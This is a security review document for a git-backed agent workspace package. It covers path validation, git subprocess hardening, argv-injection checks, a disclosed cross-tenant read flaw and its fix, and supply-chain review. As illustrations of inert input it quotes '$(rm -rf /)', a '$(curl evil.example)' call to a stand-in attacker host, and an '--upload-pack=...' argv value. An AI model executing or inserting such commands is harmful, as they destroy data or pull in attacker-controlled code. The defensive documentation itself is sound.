# Security — `@ax/workspace-git-core`

This package is the implementation behind the `workspace:*` contract. It exports one function — `registerWorkspaceGitHooks` — that registers **six** service hooks (the four base ones, `workspace:apply`, `workspace:read`, `workspace:list`, `workspace:diff`, plus the two Phase 3 bundle hooks, `workspace:apply-bundle` and `workspace:export-baseline-bundle`) on a host-side bus and stores every snapshot in a bare git repository at `<repoRoot>/<workspaceId>.git`, where `workspaceId` is derived from the calling `agentId` — one repo per agent, never one for the deployment. **Linear-history-only by construction:** every `workspace:apply` is a CAS on `refs/heads/main`. There are no branches, no merges, no rebase. The `WorkspaceVersion` opaque string happens to be a 40-hex commit SHA today, but subscribers MUST treat it as opaque (Invariant 1).

**One** consumer wraps this core: `@ax/workspace-git`, the in-process plugin for single-pod / local-CLI deployments. It imports the core directly and calls `registerWorkspaceGitHooks` at `init()` time. It is also the **chart's default** (`workspace.backend: local`), which makes this the code that serves production unless an operator opts out.

This paragraph used to promise a second consumer, `@ax/workspace-git-http`, "wrapping the same `registerWorkspaceGitHooks` and exposing the four hooks over HTTP", and concluded that both shared this security profile "because the code is the same". No such package exists. The multi-replica backend is `@ax/workspace-git-server`, it does **not** depend on this package and never calls `registerWorkspaceGitHooks` — it is a separate implementation with its own storage tier and its own SECURITY.md. We're spelling that out rather than quietly deleting a line, because the belief that the two backends shared one implementation is a decent part of how TASK-396 went unnoticed: the isolation work landed in the sharded one, and everyone assumed this one inherited it. It didn't. It had none.

So: this note covers **this** code and nothing else. Read `@ax/workspace-git-server`'s own note for that backend.

## Security review (workspace-git-core)

- **Sandbox:** Filesystem reach is fenced to `<repoRoot>/<workspaceId>.git`, and `workspaceId` is a `ws-` prefix plus 16 hex chars — a caller cannot steer it at a directory of their choosing; content writes go through `isomorphic-git`'s object-db, and **no caller-supplied path ever reaches `fs.writeFile`** (that is the load-bearing half; the bundle tempfile and the binary's own `update-ref`/`fetch`/`push` writes are ours, at paths we construct), and `validatePath` rejects `..`, absolute, NUL, backslash, and `.git` segments before any blob is written. No network — we don't ship `isomorphic-git`'s `http` variant. We **do** spawn the real `git` binary (bundle hooks, and the read paths since TASK-73) — no shell, argv arrays only, a closed hard-coded child env that does not inherit `process.env`, and a pinned `PATH`; see **Process spawn** below, which used to claim the opposite.
- **Injection:** `FileChange.content` is opaque `Uint8Array` written via `git.writeBlob` — never interpolated into a shell, path, SQL, or URL. Agent-supplied `reason` lands in the commit message and in `WorkspaceDelta.reason` (never in a shell, path or URL), and subscribers are told to treat `delta.reason` as untrusted; agent-supplied `agentId`/`userId`/`sessionId` land in `WorkspaceDelta.author` only and are never used as the git author/email (those are hard-coded `ax-runner`).
- **Supply chain:** Two runtime deps, both pinned exact: `isomorphic-git@1.37.5` (MIT, established maintainer set, no install hooks) and `picomatch@4.0.4` (MIT, Jon Schlinkert / micromatch org, no install hooks). Transitive surface is mostly self-contained pure-JS git plumbing; one entry (`simple-get`) is network-capable but unreachable from the code paths we use.

## Sandbox escape / capability leakage

The capability budget for this code is one directory and zero of everything else. Here's how each axis lands:

### Filesystem reach

`repoRoot` comes from caller config and never from a hook payload — it's set once when `registerWorkspaceGitHooks` is called. Everything we write goes under `<repoRoot>/<workspaceId>.git/` via `isomorphic-git`'s `gitdir` parameter, and the only input to `workspaceId` is the bus-supplied caller identity, hashed. The library writes loose objects into `objects/`, refs into `refs/`, packs into `objects/pack/`, and that's it. No part of this code path ever calls `fs.writeFile` with a caller-supplied path string — paths from `FileChange` go to `git.writeBlob` as content, not as filenames, and the resulting OID is the only thing that hits the FS.

For the writes that DO touch caller-supplied filenames (the path inside the tree object), `validatePath` (`impl.ts`) runs BEFORE the mutex is taken so a bad input fails fast and can't deadlock. It rejects:

- Empty / non-string paths.
- NUL bytes (which would otherwise truncate when crossing into native syscalls).
- Leading `/` (absolute paths).
- Backslashes (the workspace contract is POSIX; Windows separators get an explicit "no").
- Empty segments, `.`, and `..` (which would otherwise traverse out of the repo if a future backend resolved them naively).
- Any segment named `.git` (defense-in-depth; we don't currently materialize the working tree, but if a future backend does, this prevents writing into the metadata dir).

Reads, lists, and diffs take a `path` parameter that is resolved **inside the git object database**, never against the host filesystem. Since TASK-73 these go through the git binary as `git cat-file blob <oid>:<path>` and `git ls-tree -r -z --name-only <oid>` (not iso-git's `readBlob`/`listFiles`, whose `fs.read` adapter could coalesce a transient short read into a silently wrong answer — see `__tests__/null-slice-race.test.ts`). Either way the lookup is a tree-entry lookup: `..` in that position asks for an entry literally *named* `..` inside the tree, which does not exist, and you get a not-found. There is no host-FS traversal vector on the read side even without `validatePath`. Be precise about who picks what, because an earlier draft of this line got it backwards: the **gitdir** is `requireAgent`'s (derived from `ctx.agentId`, never from the payload), while the **oid** IS caller-supplied. So a caller chooses which object to address, and the identity gate chooses which repo it may address it in. The oid's SHAPE is constrained separately — see **Argv injection**.

### Process spawn

**Yes — we spawn the real `git` binary, and this section used to say we didn't.**

It read: *"None. We confirmed by inspection that `impl.ts` imports only `node:fs`, `node:path`, `isomorphic-git`, `picomatch`, and `@ax/core`. No `child_process`, no `execa`, no `spawn`, no shell."* Line 1 of `impl.ts` is `import { spawn } from 'node:child_process'`. The claim went stale when the read paths migrated to the git binary (TASK-73 / PR #71) and nobody came back here. We're leaving the old wording quoted above rather than silently swapping it, because "a doc that confidently describes a capability we don't have" is its own finding — and this one survived two review passes of a PR *about* false isolation claims before someone checked it against line 1.

What actually spawns, and why:

- **The bundle hooks** (`workspace:apply-bundle`, `workspace:export-baseline-bundle`). `isomorphic-git` has no bundle support at all — not create, not verify, not fetch-from-bundle. The bundle wire is the contract with the runner, so short of reimplementing the pack format, real `git` is the only option.
- **The read paths** use `git cat-file blob` and `git ls-tree` rather than `git.readBlob` / `git.listFiles`, because iso-git's `fs.read` adapter coalesces transient short reads into a silent wrong answer (the null-slice race — see `__tests__/null-slice-race.test.ts`). We took a spawn over a backend that can quietly return the wrong bytes. That covers `workspace:read`, `workspace:list`, `diff`'s snapshots — **and `workspace:apply`**, which reads the parent snapshot (`readSnapshotAt`) and lazily fetches before/after bytes for the delta (`readBlobBytes`). So: all six hooks can spawn `git`. An earlier version of this section said five, which was the count before anyone noticed apply reads its own parent.

Why it's safe, all of which is real code in `runGit` / `runGitBinary`:

- **No shell, ever.** `spawn('git', argsArray)` with an array — there is no shell to inject into, so `;`, backticks, `$(…)` and friends are inert argument text.
- **`process.env` is NOT inherited.** The child gets a closed, hard-coded env (`GIT_PROCESS_ENV`): `GIT_CONFIG_NOSYSTEM=1`, `GIT_CONFIG_GLOBAL=/dev/null`, `GIT_TERMINAL_PROMPT=0`, `HOME=/nonexistent`, a fixed `PATH`, and the pinned `ax-runner` author identity. No system or global gitconfig is read, so no `core.fsmonitor`/`core.pager`-style config-to-code vector, and no host secret reaches the child.
- **`PATH` is a closed list**, not the ambient one, so a malicious `git` earlier on the operator's `$PATH` can't be picked up.
- **`stdio` is `['ignore','pipe','pipe']`** — no stdin, so nothing can drive an interactive prompt.

### Argv injection

The argv arrays are built from OIDs and validated paths, never from raw caller text, and they are passed as an **array** — so the worst case is a malformed argument, not a second command.

Caller-influenced values that reach argv: `input.baselineCommit`, resolved commit OIDs, the bundle's new tip, and `FileChange.path`. The OIDs are either produced by `git` itself or, for `baselineCommit`, checked against a locally-computed baseline before anything is written (a mismatch throws before `gitdir` is touched). Paths have already been through `validatePath`.

The one shape worth naming: an argument that *starts with a dash* is read by `git` as a flag rather than a value, and none of our call sites use a `--` separator.

**This is now enforced structurally, not argued.** `requireOid` rejects any version that is not `[0-9a-f]{40}` before it reaches a `git` argument — on `read`, `list`, `diff` (`from` and `to`), `export-baseline-bundle` (`version`), and `apply-bundle` (`baselineCommit`). `__tests__/version-argv.test.ts` pins it with option-shaped values (`--name-only`, `-z`, `--upload-pack=...`, `--`, `-`) plus near-misses that prove it is a real regex rather than a `startsWith('-')` check.

Why the check lives HERE and not in `@ax/core`: `asWorkspaceVersion` is a bare cast with no validation, and it has to stay that way. A version's shape is a backend's business, and `MockWorkspace` deliberately mints non-SHA `mock-N` strings to prove the contract is storage-agnostic (Invariant 1). A `[0-9a-f]{40}` rule in core would be git vocabulary in the transport-agnostic layer. This backend mints SHAs, so this backend gets to demand them.

What this replaced is worth recording, because it is the more interesting half. The previous version of this section argued from CALLER DISCIPLINE — "no untrusted caller can reach a version parameter" — and that argument required a census of every plugin that forwards a version. The census was wrong: `@ax/validator-identity`, from a `workspace:pre-apply` subscriber, forwards the runner's `parent` into `workspace:read`, reaching `cat-file blob <version>:<path>`. Nothing was exploitable (git errors on a bad ref, and the ordering happened to save us), but a claim that depends on enumerating every current subscriber is not a boundary — it is a snapshot that the next plugin invalidates. A regex at the entry point is true regardless of who calls.

One field is deliberately NOT validated: `parent` on `apply` / `apply-bundle`. It never becomes an argv token — it is only string-compared against the current head, and interpolated into an error message — and narrowing it would turn a garbage parent's `parent-mismatch` into a different error code. That code is a contract: it is what the workspace-CAS rebase-retry path keys on, in `@ax/memory-strata` (`agent-tier-sync.ts`), `channel-web` (`workspace-cas.ts`, plus the agent bootstrap and identity routes), `@ax/routines-admin-routes`, and `ipc-core`'s `workspace.commit-notify` handler.

  (An earlier draft of this paragraph credited `@ax/attachments` for that retry. It no longer does any such thing — TASK-68 moved attachment bytes to `blob:put`, and `attachments/src/handlers.ts` says the `workspace:apply` → `parent-mismatch` rebase race "is gone entirely". Worth correcting rather than deleting: a maintainer auditing "who still needs `parent-mismatch`?" would check attachments, find nothing, conclude the justification was bogus, and tighten `parent` — breaking the five consumers that DO rely on it. The same stale credit survives in `core/src/workspace-apply-facade.ts` and elsewhere in `impl.ts`; those are pre-existing and filed as a follow-up.)

### Env vars

None read at the caller's direction. `repoRoot` comes from config, the bot author identity is hard-coded, and there is no `process.env[someCallerValue]` anywhere in `impl.ts`. Note the asymmetry with the section above: we do not *read* env, but we do *construct* a fixed env for the git children, and `GIT_PROCESS_ENV` deliberately starts from `{}` rather than spreading `process.env`.

### Network

None — but the reason is no longer only the one this section used to give. We import `isomorphic-git`, NOT `isomorphic-git/http/node`, so the JS client has no transport. The stronger bound, now that we shell out: **the `git` children are fully network-capable** (we run `fetch` and `push`), and what keeps them local is that every remote we hand them is a **local filesystem path** — a scratch dir, a bundle file, or the bare repo — never a URL, and never a caller-supplied string. No credential helper can fire either: `GIT_CONFIG_NOSYSTEM` plus `GIT_CONFIG_GLOBAL=/dev/null` means no `credential.helper` is configured, and `GIT_TERMINAL_PROMPT=0` blocks the interactive fallback. The transitive dep `simple-get` is pulled in because `isomorphic-git`'s package.json lists it as a dependency, but it's only invoked from the `http` code paths, which we don't touch. If we ever add `git.clone` / `git.push` / `git.fetch`, network capability arrives with them and that's a separate review.

## Tenant isolation

This is the section we should have written the first time. Until TASK-396 this
package kept **one** bare repo for the whole deployment and ignored the caller's
identity on every read. Two users on the same host shared a tree. One of them
opened their own Files tab and got the other's file. We are not going to dress
that up: it was a cross-tenant read on a live deployment, and it shipped because
the isolation story lived in the *other* backend and nobody checked that this one
had it too.

How it works now:

- Every hook resolves the caller to `ws-<16 hex>` = `sha256(JSON.stringify([agentId]))`,
  and reads/writes `<repoRoot>/<that>.git`. Different agent, different repo. The
  derivation is a byte-for-byte copy of `@ax/workspace-git-server`'s, so the two
  backends name the same workspace the same way; both sides pin the same test
  vectors so a drift fails loudly instead of orphaning repos.
- **It fails closed.** A caller with a blank `agentId` gets a
  `workspace-identity-required` error, not a default tree. There is no shared
  fallback repo left for an unauthenticated-ish caller to land in — the
  identity check runs before path validation, before the mutex, before any
  filesystem call.
- **One agent, one workspace — the partition is `agentId`, not `(userId, agentId)`.**
  That is deliberate and it is the same rule the sharded backend adopted in
  TASK-257: an agent's files belong to the agent, and every user authorized to
  reach it sees the same tree. Which means **this hash is a partition, not an
  access control**. The thing that decides whether you may reach an agent at
  all is the `agents:resolve` ACL that `channel-web`'s workspace routes run
  before every per-agent read (any error → 404). If that gate is ever bypassed
  or moved after the read, nothing downstream will save you.
- The `agentId` comes from the bus `ctx`, which callers build from an
  authenticated session plus an agent `agents:resolve` has already approved.
  This package trusts that and can't second-guess it: a caller that mints a
  synthetic `agentId` gets its own private bucket keyed on that string. Still
  not any real agent's tree — but it is why "who fills in ctx" is a
  security-relevant question one layer up.

**Upgrading an existing deployment:** the old `<repoRoot>/repo.git` is no longer
read by anything. We do NOT migrate or delete it, because nothing in it records
which agent wrote which file — guessing would be worse than leaving it. Operators
should treat it as what it is (a tree every user of that deployment could read)
and delete it once they've salvaged anything they want.

## Prompt injection / untrusted content

The agent and the model can influence three things this code sees: the `path` of a `FileChange`, the `content` bytes, and the `reason` string. None of these get treated as code.

### LLM output

Never reaches this code directly. Tools running in the sandbox may compute path strings from model output and send them up through the tool-result channel, but by the time those strings hit `workspace:apply` they've crossed the IPC bridge and are validated by `validatePath` before any FS-adjacent operation. The `safePath`-style checks (no `..`, no absolute, no `.git`, no NUL, no `\`) are a single chokepoint — there's no second path-validation lurking in `read`/`list`/`diff` because those paths resolve against the git object-db, which is structurally safe.

### Tool output

`FileChange.content` is `Bytes` (`Uint8Array`). It's written verbatim via `git.writeBlob` and read back verbatim via the git binary's `cat-file blob`. (This line said `git.readBlob` until round 4 of the TASK-396 review — the same stale iso-git-reads premise that **Process spawn** and **Filesystem reach** were corrected for, surviving in the section nobody had revised. Reads moved to the binary in TASK-73.) We never decode it, never interpret it as JSON or a shell command, never log it, never interpolate it. A blob containing `$(rm -rf /)` is just 14 bytes that go into the object-db and come back out as 14 bytes.

We do make a defensive copy of incoming bytes in `applyChanges` (`impl.ts`) so a caller mutating their input buffer after `apply` returns can't poison our snapshot, and another defensive copy on the way out of `read` and `readBlobBytes`, where we hand back `new Uint8Array(stdout)` rather than a view onto the child process's buffer. (That outbound copy was originally justified by what isomorphic-git might cache internally; reads go through `cat-file` now, so that rationale is gone — and we do NOT retain the source buffer past return, so the copy is cheap insurance against a future read path that does, not a defence against anything live today. The INBOUND copy is the load-bearing one: `applyChanges` keeps its bytes in the snapshot map, so a caller mutating its input buffer after `apply` returns really could poison us.)

### Agent-supplied `reason`

Flows into the git commit message via `git.commit({ message: input.reason ?? 'workspace apply' })`, in the `workspace:apply-internal` handler (`impl.ts`). (Not `applyChanges`, which only builds the snapshot map.) isomorphic-git serializes this into the commit object byte-for-byte; there's no shell, no template, no `eval`. A `reason` containing `\n--no-verify\n` or `$(curl evil.example)` is just text that ends up in the commit body.

That said: subscribers of the future `workspace:applied` subscriber hook MUST NOT shell-interpolate or `exec` the `reason`. If a notification subscriber pipes commit messages into a system shell ("send a Slack message that says: $reason"), they own that injection. We treat `reason` as untrusted on the producer side — anyone reading it downstream needs to do the same.

### Agent-supplied provenance

`ctx.agentId`, `ctx.userId`, and `ctx.sessionId` flow into `WorkspaceDelta.author` (`buildDelta` in `impl.ts`) and from there into the `applied` subscriber hook payload. They are NOT used as the git `author.name` / `author.email` — those are the hard-coded `BOT_AUTHOR = { name: 'ax-runner', email: 'ax-runner@example.com' }` (`BOT_AUTHOR` in `impl.ts`). The agent never gets to sign a commit as someone else. Anyone running `git log` on the repo sees `ax-runner` as the author of every commit; the human/agent provenance lives in the bus payload, where subscribers know to treat it as untrusted metadata rather than verified identity.

## Supply chain

Two runtime deps. Both pinned to exact versions in `package.json` (no `^` or `~`).

### `isomorphic-git@1.37.5`

- **License:** MIT.
- **Pin:** Exact (`"isomorphic-git": "1.37.5"`).
- **Maintainers:** `wmhilton` (William Hilton, project lead since 2017), `mojavelinux` (Dan Allen), `jcubic` (Jakub Jankiewicz). Established maintainer set, ~6+ years of releases, project is the de facto pure-JS git library on npm.
- **Install hooks:** None that fire on consumer install. `npm view isomorphic-git@1.37.5 scripts` returns `start`, `format`, `build`, `test`, `publish-website`, `prepublishOnly`, `semantic-release`, `add-contributor`. The only lifecycle script that npm/pnpm runs automatically is `prepublishOnly`, and that fires when the maintainer publishes the package, not when we install it. There is no `preinstall`, `install`, `postinstall`, or `prepare` script — confirmed.
- **Why pure-JS matters here (with an honest correction):** this bullet used to say that "the entire reason this code can claim 'no process spawn' is that `isomorphic-git` doesn't spawn `git`", and that we therefore avoid "inheriting whatever `/usr/bin/git` happens to be on the host". Neither half survives contact with the code: we **do** spawn `git`, and our pinned `PATH` **includes** `/usr/bin`. What pure-JS still buys us is real but narrower — the write path (blob/tree/commit construction, ref CAS) stays in auditable, version-pinned JavaScript, so the git binary is reached only for bundles and for the reads that TASK-73 moved (see **Process spawn**). The binary itself is an unpinned host dependency; see the `git` bullet below.
- **Transitive surface (notable entries from `npm view ... dependencies`):**
  - `clean-git-ref@^2.0.1` — ref-name validation. Tiny, pure JS.
  - `crc-32@^1.2.0` — checksums. Pure JS, pinned widely across the ecosystem.
  - `pako@^1.0.10` — zlib in pure JS. Used to compress git objects. Established library.
  - `sha.js@^2.4.12` — SHA hashing in pure JS. Used for git's content-addressed storage.
  - `async-lock@^1.4.1`, `pify@^4.0.1`, `readable-stream@^4.0.0`, `minimisted@^2.0.0`, `ignore@^5.1.4`, `diff3@0.0.3` — utility/plumbing.
  - `simple-get@^4.0.1` — HTTP client. **Network-capable, but only reached from the `isomorphic-git/http/node` sub-export**, which this package does not import. We're paying the disk-space cost without granting the capability to our code paths.

  None of the above have install hooks at the versions resolved. The transitive set is consistent with a "pure-JS git plumbing" claim; none of these *packages* phones home, reads env vars at import, or shells out. (This package's own code does shell out to `git` — that is our call site, not theirs. See **Process spawn**.)

### The `git` binary — an unpinned dependency we should name

Not an npm package, so it never shows up in a lockfile diff or an audit — which is exactly why it belongs here. Since TASK-73 this package needs a working `git` on the host, and it is the one dependency we cannot pin a hash of.

What bounds it: `PATH` is a fixed list (`/usr/local/bin:/usr/bin:/bin:/opt/homebrew/bin:/opt/local/bin`), not the ambient one, so we pick `git` from known locations rather than from whatever the operator's shell happens to have first. `GIT_CONFIG_NOSYSTEM=1` and `GIT_CONFIG_GLOBAL=/dev/null` stop a system or user gitconfig from steering that binary (no `core.pager`, no `core.fsmonitor`, no alias expansion). We do not verify the binary itself.

Practically: in the container this is the distro `git` from the image, which is pinned by the image digest. On a developer laptop it is whatever they have. If we ever need a stronger claim, the move is to pin an absolute path per deployment rather than to search a list.

### `picomatch@4.0.4`

- **License:** MIT.
- **Pin:** Exact (`"picomatch": "4.0.4"`).
- **Maintainers:** `jonschlinkert` (Jon Schlinkert, micromatch org), `mrmlnc`, `doowb`, `danez`. Established npm maintainers; `picomatch` is the glob engine behind `chokidar`, `micromatch`, `fast-glob`, and most of the file-watching ecosystem. Weekly downloads in the hundreds of millions.
- **Install hooks:** None. `npm view picomatch@4.0.4 scripts` returns `lint`, `test`, `mocha`, `test:ci`, `test:cover` — all dev-time. No `preinstall`, `install`, `postinstall`, or `prepare`.
- **Use:** `workspace:list` calls `picomatch(input.pathGlob, { dot: true })` (the `workspace:list` handler in `impl.ts`) when the caller passes a glob, and filters the listed paths through it. The matcher receives caller-supplied glob strings, but the matcher's output is just a boolean over already-validated path strings — even a maliciously crafted glob can at worst match too few or too many files, not escape the repo. The `{ dot: true }` flag means we don't silently hide entries starting with `.`.
- **Known concerns:** glob libraries have historically had ReDoS issues. `picomatch` mitigates by compiling the glob to a regex with bounded backtracking, but a sufficiently pathological glob could still spike CPU. The glob comes from a host-side caller today (the runner, not the agent); when sandbox-side tools are allowed to specify `pathGlob`, this is worth re-checking.

## Boundary review

- **Alternate impl this hook could have:** `@ax/workspace-postgres` — same four base service hooks, but storing snapshots as content-addressed blobs in Postgres (path → bytes per version, with parent pointers). The `WorkspaceVersion` would be a UUID or a hash-of-rows, not a SHA. Service hook signatures don't change; the implementation behind them does.
- **Payload field names that might leak:** on the four BASE hooks, none. `WorkspaceVersion` is opaque (that it is a SHA today is an implementation detail). `FileChange` uses `path` / `kind` / `content`; `WorkspaceDelta` uses `before` / `after` / `changes` / `reason` / `author`. No `commit`, `sha`, `oid`, `tree`, `ref` or `gitdir` crosses those. `repoRoot` is plugin-local, not on any payload.

  **On the two BUNDLE hooks, yes — and it is a known, accepted trade-off, not an oversight.** `workspace:apply-bundle` and `workspace:export-baseline-bundle` carry `bundleBytes` and `baselineCommit`; the second word is literally "commit". This is the I1 trade-off recorded in `@ax/core`'s `workspace.ts` and restated at the bundle section of `impl.ts`: the bundle wire is how a runner ships a turn's commits home, and there is no storage-agnostic spelling of a git bundle. They are OPTIONAL service hooks precisely so a non-git backend can decline to register them rather than pretend. Saying "none" here, as this bullet used to, hid the one real leak behind a clean answer about the other four.
- **Subscriber risk:** subscribers MUST treat `before` / `after` as opaque strings — if a subscriber tries to parse them as 40-hex SHAs, they break the day a Postgres-backed alternate impl ships.
- **Wire surface (IPC):** none. The only consumer (`@ax/workspace-git`) runs in-process and has no wire surface. (The multi-replica backend, `@ax/workspace-git-server`, has one — but it does not use this code, so it is reviewed in its own SECURITY.md, not here.)

## Known limits

- **Unique writer per `gitdir`.** A `Mutex` **per agent** (`impl.ts`, `class Mutex` + the `mutexes` map in `registerWorkspaceGitHooks`) serializes applies to one agent's repo within one process. Two different agents write to two different repos, so serializing them against each other would buy nothing. The only consumer maintains the "single writer per `gitdir`" property by construction: `@ax/workspace-git` runs in the host process and there is only one host. If a future deployment shape ever runs two `registerWorkspaceGitHooks` callers against the same `repoRoot`, the in-process mutex stops being enough and we need an external lock (advisory lock in Postgres, or a real ref-update CAS).
- **No GC.** Failed applies leave dangling blobs and trees in `objects/`. `isomorphic-git` doesn't ship a `git gc` equivalent, and we don't run one. Disk usage grows monotonically with churn; for the MVP this is fine, but a long-lived repo will eventually want a sweeper.
- **No working-tree materialization.** This code is bare-repo only. Tools that need a checkout (e.g., a build that compiles a project) get bytes via `workspace:read` and write to a scratch dir themselves. That's a deliberate capability minimization — checkouts mean filesystem reach beyond the owner's bare repo, which would expand the sandbox story.
- **No commit signing.** All commits are unsigned. If we ever need to prove provenance from the git history alone (rather than from the bus audit log), we'll need to plumb a signing key. Not on the roadmap; the bus audit log is the source of truth for provenance.
- **`reason` length and content are unchecked.** A 10MB commit message would be silently accepted. Practical exploit surface is low (it ends up in the commit body, not a shell), but if storage costs matter we may add a length cap.

## What we don't know yet

- ~~Whether two tenants applying identical bytes produce the same `WorkspaceVersion`, leaking the existence of identical content across tenants.~~ **Struck: the premise is wrong.** `WorkspaceVersion` is the COMMIT oid, and a commit's oid includes its author/committer timestamps. `BOT_AUTHOR` carries no fixed date and the apply path passes none, so isomorphic-git stamps wall-clock time — two tenants applying identical bytes at different moments get different commit oids. Identical content does collide at the TREE oid, but a tree oid is never handed out as a `WorkspaceVersion`. (The deterministic empty-baseline bundle is the deliberate exception: it pins `GIT_AUTHOR_DATE`/`GIT_COMMITTER_DATE` to the epoch precisely so both sides of the runner wire compute the same seed oid — and it encodes no tenant content.)
- How `workspace:applied` subscribers should handle a `reason` that contains a newline or a control character. We'll punt on this until that subscriber hook lands and we have a concrete subscriber to design against.
- Whether the per-repo mutex should also serialize reads. Today reads run concurrently with writes, and that is safe for a reason that has nothing to do with which client does the reading: git objects are immutable and content-addressed, so a concurrent write cannot change an object a reader already resolved. The worst case is reading a slightly stale ref. If a future backend has weaker isolation we may need to revisit.

  (Two corrections' worth of history in one bullet, kept because the pattern is the point. It first credited isomorphic-git for the immutability property, which was never iso-git's to own. The fix for that then overcorrected to “reads go through the git binary now” — also wrong *here*, because the read this bullet is about is the REF read, `resolveHead` → `git.resolveRef`, which is still isomorphic-git. Only workspace CONTENT reads moved to the binary. That is the fifth instance in this file of the same iso-git-versus-binary overgeneralization — and the second one introduced while fixing an earlier one.)

## Security contact

If we find a hole, we'd rather hear about it from you than read about it on Hacker News. Please email `vinay@canopyworks.com`.
